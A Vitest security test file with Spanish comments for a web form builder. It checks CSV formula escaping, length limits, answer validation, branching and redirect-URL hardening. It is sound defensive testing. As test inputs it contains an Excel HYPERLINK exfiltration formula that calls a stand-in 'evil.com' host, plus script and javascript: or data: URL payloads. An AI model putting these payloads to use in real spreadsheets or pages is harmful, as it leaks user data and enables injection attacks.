import { describe, it, expect } from "vitest";
import { csvCell, buildCsv } from "@/lib/forms/csv";
import { validateAnswers, formSettingsSchema, parseFormSchema } from "@/lib/forms/schema";
import { computePath } from "@/lib/forms/branching";
import type { Question, FormSchema } from "@/lib/forms/types";

// ── CSV / Excel formula injection ───────────────────────────────────────────
describe("seguridad — inyección de fórmulas CSV", () => {
  it("neutraliza celdas que empiezan con = + - @", () => {
    expect(csvCell("=1+1")).toBe("'=1+1");
    expect(csvCell("+47")).toBe("'+47");
    expect(csvCell("-2")).toBe("'-2");
    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
  });
  it("neutraliza fórmula de exfiltración clásica", () => {
    const malicious = '=HYPERLINK("http://evil.com?"&A1,"click")';
    const cell = csvCell(malicious);
    // El '=' queda precedido por comilla simple → Excel lo trata como texto, no fórmula.
    expect(cell.includes("'=HYPERLINK")).toBe(true);
  });
  it("escapa comillas, comas y saltos de línea", () => {
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('di "hola"')).toBe('"di ""hola"""');
    expect(csvCell("línea1\nlínea2")).toBe('"línea1\nlínea2"');
  });
  it("texto normal pasa sin cambios", () => {
    expect(csvCell("Juan Pablo")).toBe("Juan Pablo");
  });
  it("buildCsv incluye BOM y usa CRLF", () => {
    const csv = buildCsv([["a", "b"], ["1", "2"]]);
    expect(csv.charCodeAt(0)).toBe(0xfeff);
    expect(csv).toContain("\r\n");
  });
});

// ── Límites de tamaño (anti abuso de almacenamiento) ────────────────────────
describe("seguridad — topes de longitud", () => {
  const shortQ = [{ id: "s", type: "short_text", title: "s", required: true }] as Question[];
  const longQ = [{ id: "l", type: "long_text", title: "l", required: true }] as Question[];
  const emailQ = [{ id: "e", type: "email", title: "e", required: true }] as Question[];
  const phoneQ = [{ id: "p", type: "phone", title: "p", required: true }] as Question[];

  it("rechaza texto corto gigante (>5000)", () => {
    expect(validateAnswers(shortQ, { s: "x".repeat(5001) }).ok).toBe(false);
  });
  it("rechaza texto largo gigante (>50000)", () => {
    expect(validateAnswers(longQ, { l: "x".repeat(50001) }).ok).toBe(false);
  });
  it("rechaza email gigante", () => {
    expect(validateAnswers(emailQ, { e: "a".repeat(320) + "@x.com" }).ok).toBe(false);
  });
  it("rechaza teléfono gigante", () => {
    expect(validateAnswers(phoneQ, { p: "9".repeat(41) }).ok).toBe(false);
  });
  it("acepta longitudes razonables", () => {
    expect(validateAnswers(shortQ, { s: "hola" }).ok).toBe(true);
  });
});

// ── Anti-spoofing de opciones / tipos ───────────────────────────────────────
describe("seguridad — validación de respuestas", () => {
  const qs = [
    { id: "color", type: "single_choice", title: "Color", required: true, choices: [{ id: "1", label: "Rojo", value: "rojo" }] },
    { id: "ok", type: "consent", title: "Acepto", required: true, consentText: "..." },
    { id: "rate", type: "rating", title: "Nivel", required: true, scale: 5 },
  ] as Question[];

  it("rechaza opción fuera del set declarado", () => {
    expect(validateAnswers(qs, { color: "verde<script>", ok: true, rate: 3 }).ok).toBe(false);
  });
  it("rechaza consentimiento no aceptado", () => {
    expect(validateAnswers(qs, { color: "rojo", ok: false, rate: 3 }).ok).toBe(false);
  });
  it("rechaza calificación fuera de escala", () => {
    expect(validateAnswers(qs, { color: "rojo", ok: true, rate: 99 }).ok).toBe(false);
  });
});

// ── Anti-spoofing por ramificación (no enviar respuestas a preguntas saltadas) ──
describe("seguridad — ramificación: respuestas fuera del camino se descartan", () => {
  const schema: FormSchema = {
    questions: [
      { id: "a", type: "yes_no", title: "¿Saltar B?", required: true },
      { id: "b", type: "short_text", title: "Secreto B", required: true },
      { id: "c", type: "short_text", title: "C", required: true },
    ],
    logic: [
      { id: "r", sourceQuestionId: "a", match: "all", conditions: [{ questionId: "a", operator: "eq", value: true }], action: { type: "jump", targetQuestionId: "c" } },
    ],
  };

  it("cuando a=true se salta b; respuesta inyectada a b se descarta", () => {
    const answers = { a: true, b: "inyectado", c: "valido" };
    const path = computePath(schema, answers);
    expect(path.map((q) => q.id)).toEqual(["a", "c"]);
    const { ok, cleaned } = validateAnswers(path, answers);
    expect(ok).toBe(true);
    expect(cleaned.b).toBeUndefined(); // b NO se guarda aunque se haya enviado
    expect(cleaned.c).toBe("valido");
  });

  it("cuando a=false, b es requerido y vacío → falla", () => {
    const answers = { a: false };
    const path = computePath(schema, answers);
    expect(path.map((q) => q.id)).toEqual(["a", "b", "c"]);
    expect(validateAnswers(path, answers).ok).toBe(false);
  });
});

// ── Hardening de settings (open redirect / javascript:) ─────────────────────
describe("seguridad — redirectUrl", () => {
  it("rechaza javascript:", () => {
    expect(formSettingsSchema.safeParse({ redirectUrl: "javascript:alert(1)" }).success).toBe(false);
  });
  it("rechaza data:", () => {
    expect(formSettingsSchema.safeParse({ redirectUrl: "data:text/html,<script>" }).success).toBe(false);
  });
  it("acepta https", () => {
    expect(formSettingsSchema.safeParse({ redirectUrl: "https://juanpabloloaiza.com/gracias" }).success).toBe(true);
  });
});

// ── Integridad de la definición (forward-only, sin loops) ───────────────────
describe("seguridad — parseFormSchema rechaza definiciones peligrosas", () => {
  const qs = [
    { id: "a", type: "short_text", title: "a", required: false },
    { id: "b", type: "short_text", title: "b", required: false },
  ];
  it("rechaza salto hacia atrás (anti-loop)", () => {
    const logic = [{ id: "r", sourceQuestionId: "b", match: "all", conditions: [{ questionId: "b", operator: "is_not_empty" }], action: { type: "jump", targetQuestionId: "a" } }];
    expect(() => parseFormSchema({ questions: qs, logic })).toThrow();
  });
});
